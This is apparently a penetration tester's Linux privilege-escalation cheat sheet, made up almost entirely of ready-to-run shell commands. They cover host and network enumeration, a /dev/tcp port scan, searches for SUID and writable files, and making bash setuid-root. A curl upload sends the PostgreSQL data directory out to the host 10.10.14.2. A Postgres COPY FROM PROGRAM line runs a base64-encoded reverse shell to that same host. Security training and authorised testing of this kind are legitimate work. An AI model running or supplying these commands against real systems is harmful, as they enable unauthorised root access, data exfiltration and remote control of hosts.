---
description: >-
  The root account on Linux systems provides full administrative level access to
  the operating system. Fully compromising the host would allow us to capture
  traffic and access sensitive files
---

# Linux Privilege Escalation

### Enumeration

```bash
# Check enviroment
env

# List processes
ps aux | grep root
ps au

# Check history
History

# Sudo 
sudo -l

# Cron Jobs
ls -la /etc/cron.daily/

# Check OS
cat /etc/os-release
cat /etc/lsb-release
uname -a

# Network
route
arp -a
ss -ltnp
netstat -ano

# Ping sweep
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;

# Port scan
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null 
```

#### Files & Directories

```bash
# Find writeable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Find writeable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Find hidden files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep username

# Find hidden directories
find / -type d -name ".*" -ls 2>/dev/null

# Find user
find / -user username 2>/dev/null | grep -v '^/proc\|^/sys\|^/run'

# Find group
find / -group staff -writable 2>/dev/null | grep -v '^/proc\|^/sys\|^/run'

# Find files on extensions
find . -name '*.java'

# Webroots
ls /var/www/html
ls /var/www/html/sitename
```

#### Special permissions

```bash
# Find SUID 
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find SGID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Change owner
chown root:root bash 

# Read, write, and execute permissions to everyone
chmod 4777 bash
```

<details>

<summary>Various</summary>

```bash
# Check for append-only attribute 
lsattr script.sh
-----a--------e--- script.sh
```

</details>

#### Upload a file from host

```bash
# Install
sudo python3 -m pip install --user uploadserver

# Create certs
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

# Directories
mkdir https && cd https

# Start server
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

# Upload file
curl -X POST https://10.10.14.2/upload -F 'files=@/var/lib/postgresql/' --insecure
```

#### Postgres command execution

```bash
# Create table
CREATE TABLE my_table (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    position VARCHAR(50),
    salary NUMERIC(10, 2)
);

# Reverse shell
COPY my_table FROM PROGRAM 'echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzg4ODggMD4mMQ==" | base64 -d | bash';
```



#### For credential hunting&#x20;

{% content-ref url="credential-hunting.md" %}
[credential-hunting.md](credential-hunting.md)
{% endcontent-ref %}



